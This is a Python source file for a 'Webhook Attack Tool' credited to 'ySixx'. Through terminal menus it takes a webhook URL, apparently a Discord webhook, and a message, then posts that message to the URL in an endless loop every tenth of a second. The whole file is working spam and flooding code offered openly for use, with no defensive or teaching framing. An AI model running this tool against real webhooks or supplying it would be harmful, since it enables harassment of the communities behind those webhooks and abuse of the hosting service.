# Credits: ySixx
# Discord: ysixx#0000

import requests
import os
import sys
import time

class WebhookAttack:
    def __init__(self):
        self.R = '\033[91m'
        self.Y = '\033[93m'
        self.G = '\033[92m'
        self.CY = '\033[96m'
        self.W = '\033[97m'
        self.webhook_url = None
        self.message = None

    def start(self):
        os.system('clear')
        print(self.CY + """
@@@  @@@  @@@@@@   @@@@@@  @@@  @@@       @@@@@@  @@@@@@@ @@@@@@@  @@@@@@   @@@@@@@ @@@  @@@
@@!  @@@ @@!  @@@ @@!  @@@ @@!  !@@      @@!  @@@   @@!     @@!   @@!  @@@ !@@      @@!  !@@
@!@!@!@! @!@  !@! @!@  !@! @!@@!@!       @!@!@!@!   @!!     @!!   @!@!@!@! !@!      @!@@!@! 
!!:  !!! !!:  !!! !!:  !!! !!: :!!       !!:  !!!   !!:     !!:   !!:  !!! :!!      !!: :!! 
 :   : :  : :. :   : :. :   :   :::       :   : :    :       :     :   : :  :: :: :  :   :::
                                                                                              """ + self.Y + """v1.0""" + self.G + """
        
        
         Webhook Attack Tool
        
        """ + self.R + """>>""" + self.Y + """----""" + self.CY + """ Author - ySixx """ + self.Y + """----""" + self.R + """<<""")

    def menu(self):
        try:
            print(self.R + """\n
    #""" + self.Y + """ Select option""" + self.G + """ >>""" + self.Y + """
    
    1)""" + self.G + """ Start Webhook Attack""" + self.Y + """
    2)""" + self.G + """ Exit
    """)
            ch = int(input(self.CY + "Enter Your choice: " + self.W))
            if ch == 1:
                self.set_webhook()
                self.set_message()
                self.attack_menu()
            elif ch == 2:
                print(self.Y + "Exit................" + self.W)
                sys.exit(0)
            else:
                print(self.R + "\nInvalid choice! Please try again\n")
                self.menu()
        except ValueError:
            print(self.R + "\nInvalid choice! Please try again\n")
            self.menu()

    def set_webhook(self):
        self.webhook_url = input(self.G + "\n>>> " + self.Y + "Enter Webhook URL:" + self.W + " ")
        if not self.webhook_url:
            print(self.R + "\nWebhook URL cannot be empty!")
            self.set_webhook()

    def set_message(self):
        self.message = input(self.G + "\n>>> " + self.Y + "Enter Message to Send:" + self.W + " ")
        if not self.message:
            print(self.R + "\nMessage cannot be empty!")
            self.set_message()

    def attack_menu(self):
        try:
            print(self.R + """\n
    #""" + self.Y + """ Webhook Attack Options""" + self.G + """ >>""" + self.Y + """
    
    1)""" + self.G + """ Start Attack""" + self.Y + """
    2)""" + self.G + """ Cancel
    """)
            ch = int(input(self.CY + "Enter Your choice: " + self.W))
            if ch == 1:
                self.start_attack()
            elif ch == 2:
                self.menu()
            else:
                print(self.R + "\nInvalid choice! Please try again\n")
                self.attack_menu()
        except ValueError:
            print(self.R + "\nInvalid choice! Please try again\n")
            self.attack_menu()

    def start_attack(self):
        print(self.G + "Attack started. Press Ctrl + C to stop.")
        while True:
            message = {
                "content": self.message
            }
            try:
                response = requests.post(self.webhook_url, json=message)
                if response.status_code == 204:
                    print(self.G + "Message sent successfully!")
                else:
                    print(self.R + "Failed to send message. Status code:", response.status_code)
            except requests.RequestException as e:
                print(self.R + "An error occurred:", e)
            time.sleep(0.1)

    def run(self):
        try:
            self.start()
            self.menu()
        except KeyboardInterrupt:
            print(self.Y + "\nInterrupted! Have a nice day :)" + self.W)

if __name__ == "__main__":
    webhook_attack = WebhookAttack()
    webhook_attack.run()
